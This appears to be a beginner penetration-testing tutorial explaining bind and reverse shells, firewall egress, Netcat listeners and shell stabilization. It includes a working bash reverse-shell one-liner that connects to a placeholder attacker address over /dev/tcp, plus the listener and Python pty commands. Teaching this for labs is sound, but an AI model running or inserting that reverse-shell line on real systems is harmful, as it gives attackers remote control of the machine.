## 1. What Is a Shell?

A **shell** is an interface that allows you to interact with an operating system by executing commands.

For example, on Linux:
```bash
whoami
pwd
ls
```

On Windows:
```cmd
whoami
hostname
dir
```

During penetration testing, a shell can be obtained after successfully exploiting a vulnerable application or service.

The basic idea is:
```text
Attacker
   ↓
Compromised Target
   ↓
Shell
   ↓
Execute commands
```

---

# 2. Bind Shell vs Reverse Shell

There are two fundamental shell connection models.

## Bind Shell

The **target listens** for the attacker.
```text
Attacker ───────────────► Target
                         Listening port
```

The target opens a listening port, and the attacker connects to it.

Example concept:
```text
Target:
Listening on TCP 4444

Attacker:
Connects to TARGET:4444
```

---

## Reverse Shell

The **target connects back** to the attacker.
```text
Target ─────────────────► Attacker
       Reverse connection
```

The attacker starts a listener, and the compromised target initiates the connection.

Example:
```text
Attacker:
Listening on 4444

Target:
Connects to ATTACKER:4444
```

Example Script
```bash
#!/bin/bash
bash -i >& /dev/tcp/LHOST_IP/4444 0>&1
```

---

# 3. Why Reverse Shells Are Common

Reverse shells are often useful because of network restrictions.

Imagine:
```text
Internet
   |
Firewall
   |
Target
```

The target may be able to make outbound connections even though incoming connections to the target are blocked.

Therefore:
```text
Inbound:
Attacker → Target
     X
   blocked

Outbound:
Target → Attacker
     ✓
```

A reverse shell can take advantage of the allowed outbound connection.

This is highly dependent on the network configuration and security controls.

---

# 4. Netcat Listener

A common tool for basic shell labs is Netcat.

Depending on the Netcat implementation:
```bash
nc -lvnp 4444
```

means approximately:
```text
-l  → listen
-v  → verbose
-n  → don't resolve DNS names
-p  → local port
```


---

# 5. Shell Types

A shell can be:

### Interactive

You can enter commands and immediately receive output.
```text
$ whoami
student
```

### Non-interactive

Commands may execute, but the shell doesn't behave like a normal terminal.

This can cause problems with:
- Arrow keys
- Tab completion
- Ctrl+C
- Full-screen programs
- Password prompts
- Terminal resizing

This is why **shell stabilization** is important.

---

# 6. Shell Stabilization

A raw shell may initially look like:

```text
$ 
```

but behave strangely.

For example:

```text
$ python3
```

may not provide a usable interactive experience.

Shell stabilization attempts to turn the raw shell into a more functional terminal.

Common goals:

```text
Command editing
Tab completion
Ctrl+C handling
Terminal dimensions
Interactive programs
```

---

# 7. Python PTY Technique

On Linux targets where Python is available, a common  technique is:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

This creates a pseudo-terminal.

**PTY = Pseudo-Terminal**.
In Linux, a PTY is a **virtual terminal interface** that allows a program—such as a shell—to behave as if it's connected to a real terminal.


Availability depends on whether Python exists on the target.

---

# 8. Shells and Operating Systems
Different operating systems have different shell environments.
### Linux
Common shells:
```text
/bin/bash
/bin/sh
/bin/zsh
```
### Windows
Common command environments:
```text
cmd.exe
PowerShell
```

The payload must be appropriate for the target operating system.

---

# 9. Common Shell Problems

### Firewall
The connection is blocked.
### Wrong interface
Your machine may have multiple interfaces:
```text
eth0
wlan0
tun0
```
You need the address reachable by the target.

### Wrong payload
The payload isn't compatible with the target OS/architecture.


